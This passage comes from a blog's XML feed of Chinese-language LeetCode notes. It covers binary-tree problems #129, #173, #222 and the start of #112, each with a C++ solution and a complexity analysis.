          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
            <tag> BFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>所有 Root-Leaf 路徑總和 | Medium | LeetCode#129. Sum Root to Leaf Numbers</title>
      <link href="/posts/d1a67e73.html"/>
      <url>/posts/d1a67e73.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/129/question1.jpeg"><br><img src="/img/LeetCode/129/question2.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述：給定一個 Binary Tree 的 <code>root</code>，樹中的節點值為 0~9 的其中一個數字，從 Root 到 leaf 的節點值可以形成一個整數  ( <code>1-&gt;2-&gt;3</code> 就代表 <code>123</code> )，每一條從root到 leaf的路徑都有一個數字，本題需要你將每個數字加總。</li></ul><div class="note info flat"><p>題目有提示，回傳的整數會需要為 <strong>32-bit 整數</strong></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這次的想法就會是，這種題目就是可以用 dfs 或者是 bfs 來解，這次選用 dfs 並且在每次拜訪節點的時候去紀錄節點值，並且可以再回傳到原先的 caller 的時候將原先的路徑值乘上10 (才能夠形成一個 10 進位數字)，然後後夾到當前節點值，一路遞迴回去就能得到某一路徑的加總值。</p><p>之後再將所有路徑的和在加總起來回傳就好。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span> <span class="params">(TreeNode *current, <span class="type">int</span> pathsum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        pathsum = current -&gt; val + pathsum * <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;left != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(current -&gt; left, pathsum);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;right != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(current -&gt; right, pathsum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;left == <span class="literal">nullptr</span> &amp;&amp; current-&gt;right == <span class="literal">nullptr</span>) sum += pathsum;</span><br><span class="line">        pathsum = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumNumbers</span><span class="params">(TreeNode* current)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(current, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我這裡拆分成兩個函數: <code>dfs</code> 以及題目給得 <code>sumNumbers</code> 也另外定義了兩個變數 <code>sum</code> 以及 <code>pathsum</code> </p><ul><li><code>sum</code> 用於儲存個條路徑總和的加總</li><li><code>pathsum</code> 則是在 DFS 過程中儲存節點的加總值</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span> <span class="params">(TreeNode *current, <span class="type">int</span> pathsum)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">    pathsum = current -&gt; val + pathsum * <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;left != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(current -&gt; left, pathsum);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;right != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(current -&gt; right, pathsum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;left == <span class="literal">nullptr</span> &amp;&amp; current-&gt;right == <span class="literal">nullptr</span>) sum += pathsum;</span><br><span class="line">    pathsum = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先如果遇到 <code>nullptr</code> 就直接返回。而我們在拜訪節點的時候，會去將當前節點值，加上 <code>pathSum</code> 乘上 10，這代表將先前的節點進位並與當前節點值形成數字，並且更新到 <code>pathSum</code> 變數中，接著就是繼續 traverse，在遞迴左右子樹的過程中，一樣將 <code>pathSum</code> 作為參數，再下一次迭代中一樣去更新節點值，形成更大的數字。</p><blockquote><p>可以看下面圖解</p></blockquote><p><img src="/img/LeetCode/129/algo.png"></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/129/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>用 DFS 遍歷了每個節點，因此是 $O(N)$，N 為節點數量。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>遞迴時候的 call stack 會與樹的形狀有關，最壞狀況會是 $O(N)$，如果是平衡樹就會是 $O(LogN)$</p><p><code>sum</code> 或者 <code>pathSum</code> 等變數就是常數級別的複雜度，因此整體而言空間複雜度為 $O(N)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元搜尋樹迭代器 | Medium | LeetCode#173. Binary Search Tree Iterator</title>
      <link href="/posts/4a669d62.html"/>
      <url>/posts/4a669d62.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/173/question1.png"><br><img src="/img/LeetCode/173/question2.png"></p><ul><li><p>題目難度： <code>Easy</code></p></li><li><p>題目敘述： 題目要求你實作一個 <code>BSTIterator</code> 作為二元樹的 Iterator，可以對一個 Binary Search Tree 進行 in-order traversal</p></li><li><p><code>BSTIterator(TreeNode root)</code> 為 <code>BSTIterator</code> class 的 constructor，整個 BST 的 <code>root</code> 會作為 constructor 的初始參數</p></li><li><p><code>boolean hasNext()</code> 會去檢查當前 pointer 的右側是否有值存在，如果有就回傳 <code>true</code> 否則則是 <code>false</code></p></li><li><p><code>int next()</code> 則會將指標移動到下一個指標，並且回傳其指向的資料值</p></li></ul><div class="note info flat"><p>注意：第一次呼叫 <code>next()</code> 會需要回傳 null，可假設每次呼叫 <code>next()</code> 都會 valid，也就是每次呼叫都會至少有一個值可被回傳 （以 in-order traversal<br>順序） </p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始有點被我的<a href="https://leozzmc.github.io/posts/tree_for_leetcode_2.html">這篇文章</a>誤導，我原先的想法也是要找到 leftmost 元素，接下來去找 successor (即下一個節點)，但下一個節點可能會是右子樹中的最左節點，或者是以 left-child 身份往回找到的 ancestor。在往回找 ancestor 這邊會仰賴 <code>parent</code> 指標，但題目中對於 <code>TreeNode</code> 的成員中並沒有 <code>parent</code> 因此這樣的做法會行不通。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BSTIterator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode *current = <span class="literal">nullptr</span>;</span><br><span class="line">    queue &lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="built_in">BSTIterator</span>(TreeNode* root)&#123;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(current-&gt;left);</span><br><span class="line">        q.<span class="built_in">push</span>(current-&gt;val);</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(current-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> top = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">return</span> top;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasNext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your BSTIterator object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * BSTIterator* obj = new BSTIterator(root);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;next();</span></span><br><span class="line"><span class="comment"> * bool param_2 = obj-&gt;hasNext();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>這裡主要思維會是， <strong>Binary Search Tree 其實其實也就是滿足 In-order Traversal 的 Tree，因此只要對整顆樹進行 In-Order Traversal，將節點依序保存即可。</strong></p><p>因此我們額外宣告了一個 queue <code>q</code> 來用於保存節點，另外我們也在 class 內另外宣告一個 <code>inorderTraversal</code> ，當我們在拜訪節點的時候同時將資料值 push 進 queue 中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(current-&gt;left);</span><br><span class="line">        q.<span class="built_in">push</span>(current-&gt;val);</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(current-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然後我們一開始在 constructor 中就呼叫 <code>inorderTraversal</code> , 這樣在初始化class的時候就可以將節點全部拜訪完畢</p><p>接著在 <code>next()</code> 中依序將 queue 中節點取出。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> top = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">return</span> top;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦 queue 中還有值，就還有下個節點存在，反之則否。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hasNext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/173/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><code>BSTIterator(TreeNode* root)</code> : $O(N)$</li><li><code>int next()</code>: 對 queue 中的第一個元素進行 pop操作，因此是 $O(1)$ </li><li><code>bool hasNext()</code>: 檢查 queue 大小而已，$O(1)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>queue 所使用的空間會佔用 $O(N)$ 的複雜度，而遞迴走訪的call stack 會佔用 $O(h)$, h 為樹高，最壞狀況為 $O(N)$<br>因此整體而言空間複雜度為 $O(N)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>計算完整二元術節點 | Easy | LeetCode#222. Count Complete Tree Nodes</title>
      <link href="/posts/e51c6896.html"/>
      <url>/posts/e51c6896.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/222/question1.jpeg"></p><p><img src="/img/LeetCode/222/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目要求給定一個 <strong>Complete Binary Tree</strong> 的 <code>root</code>，需要計算 Tree 中的所有節點</li></ul><blockquote><p>根據<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%8F%89%E6%A0%91">維基百科</a>定義，在一顆二元樹中，若除最後一層外的其餘層都是滿的，並且最後一層要麼是滿的，要麼在右邊缺少連續若干節點，則此二元樹為完全二元樹（Complete Binary Tree）。深度為k的完全二元樹，至少有 $\displaystyle 2^{\begin{aligned}k-1\end{aligned}}$ 個節點，至多有 $\displaystyle 2^{\begin{aligned}k\end{aligned}}-1$　個節點。</p></blockquote><p>最後題目有個要求是，<strong>請設計一套演算法其時間複雜度小於 $O(n)$</strong></p><p><img src="/img/LeetCode/222/tree.png"></p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題我一開始的想法其實都是 $O(N)$ 的做法 (各種 Traversal 算節點)，到後面是想說，首先可以瘋狂往樹的左子樹走就可以知道整顆 Tree 的 leftmost 節點，這樣也就能夠知道這個Tree 的高度。 接下來只要能夠知道 leaf 數量就能夠得到節點總數了。</p><p>但為了找到 leaf，我想到的所有辦法都必須先耗費 $O(N)$ 的複雜度，因為如果在已知高度的狀況，剩餘未知就是最後一層的數量。</p><div class="note info flat"><p>之後參考了 <a href="https://leetcode.wang/leetcode-222-Count-Complete-Tree-Nodes.html">這篇</a> 的做法，才恍然大悟，其實一定還是會有 Traversal，但我們把部分狀況的複雜度降低，那整體的時間複雜度就不會是 $O(N)$ 了，但是為了找到 Leaf，大多做法肯定會讓複雜度提升到 $O(N)$，所以需要換一種作法</p></div><h2 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h2><p>在提到正確做法前，需要知道甚麼是 Perfect Binary Tree，可以參考我之前的紀錄 - <a href="https://leozzmc.github.io/posts/tree_for_leetcode.html#Binary-Tree">樹 (Tree) | 基礎篇</a>，一個 Perfect Binary Tree 代表除了Leaf Node外，所有節點都有兩個 child node，並且所有 leaf node 都有相同高度</p><p><img src="/img/LeetCode/222/perfect.png"></p><div class="note info flat"><p>對於一個 Perfect Binary Tree，節點的總數就是一個累加值: $2^{0} + 2^{1} + … + 2^{h-1}$ 其中 $h$ 為樹的高度。透過等比數列可以計算最後的 sum 會是 $2^{h}-1$，這也就滿足剛剛所說 Complete Binary Tree 的節點數量範圍，畢竟 Complete Binary Tree 在最後一層填滿後就會是 Perfect Binary Tree 了</p></div><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>如果今天是一個普通的Binary Tree 求節點，那僅需要寫下面這樣就好:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==null) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">countNodes</span>(root-&gt;left) + <span class="built_in">countNodes</span>(root-&gt;right) +<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這樣它會遞迴找到 leaf，並且從 leaf 開始加1累加回最一開始的caller。</p><p>而今天我們題目中，對於 Perfect Binary Tree 有公式解: $2^{h}-1$，因此把他從遞迴中獨立出來計算，<strong>所以就會需要先判斷Tree 是否是 perfect 的</strong></p><p>我們可以透過找到 Tree 中的 Leftmost node 以及 rightmost node 來知道樹的左側高度跟右側高度，如果高度不一樣那就不是 Perfect Binary Tree，反之則為 Perfect Binary Tree。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> counter =<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        TreeNode *current = root;</span><br><span class="line">        <span class="keyword">if</span>(current==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> leftheight=<span class="number">0</span>;</span><br><span class="line">        TreeNode *leftNode = root;</span><br><span class="line">        <span class="keyword">while</span>(leftNode!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            leftNode=leftNode-&gt;left;</span><br><span class="line">            leftheight++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> rightheight=<span class="number">0</span>;</span><br><span class="line">        TreeNode *rightNode = root;</span><br><span class="line">        <span class="keyword">while</span>(rightNode!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            rightNode=rightNode-&gt;right;</span><br><span class="line">            rightheight++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// perfect binary tree, the number of nodes is 2^0+2^1+2...+2^h (h is the height of tree) = 2^h -1</span></span><br><span class="line">        <span class="keyword">if</span>(leftheight == rightheight)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; leftheight) <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">countNodes</span>(current-&gt;left) + <span class="built_in">countNodes</span>(current-&gt;right) +<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/222/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>這題的重點會是複雜度，需要確定這樣的複雜度是否小於 $O(N)$</p><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>對於 <code>countNodes</code> 的時間計算假設為 $T(n)$ 那對於他的左右子樹的時間計算就會是 $T(n&#x2F;2)$，對於每一層計算高度的複雜度可以記為 $log_{2}n$</p><p>因此對於一個Non-perfect binary tree (Complete Binary Tree) 的計算耗費時間可以記為 $T(n)&#x3D;T(n&#x2F;2)+ c \cdot log_{2}n $ 如果逐項遞迴進行化簡</p><p>$T(n&#x2F;2) &#x3D; T(n&#x2F;4) + c \cdot log_{2}(n&#x2F;2)$, $T(n)&#x3D;T(n&#x2F;4)+ c \cdot log_{2}(n&#x2F;2) + c \cdot log_{2}(n) $ 一路計算下去</p><p>$T(n) &#x3D; T(1) + c \cdot 2 log(n) \cdot (log(N+1))$</p><p>因此整體時間複雜度為 $O(Log^{2}n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(logn)$，主要由 function call stack 深度決定。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Complete Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹路徑總和 | Easy | LeetCode#112. Path Sum</title>
      <link href="/posts/74aa4179.html"/>
      <url>/posts/74aa4179.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/112/question1.jpeg"></p><p><img src="/img/LeetCode/112/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個二元樹的 <code>root</code> 以及一個整數 <code>targetSum</code>，若從 root 到 任意leaf 之間節點值的加總等於 <code>targetSum</code> 則回傳 true</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/112/algo.png"></p><p>這題一開始的想法就是用 DFS，去找到 root，途中運用變數來儲存節點值，邊traverse 邊累加節點值，走到leaf就能夠知道是否等於 <code>targetSum</code></p><h2 id="錯誤寫法"><a href="#錯誤寫法" class="headerlink" title="錯誤寫法"></a>錯誤寫法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 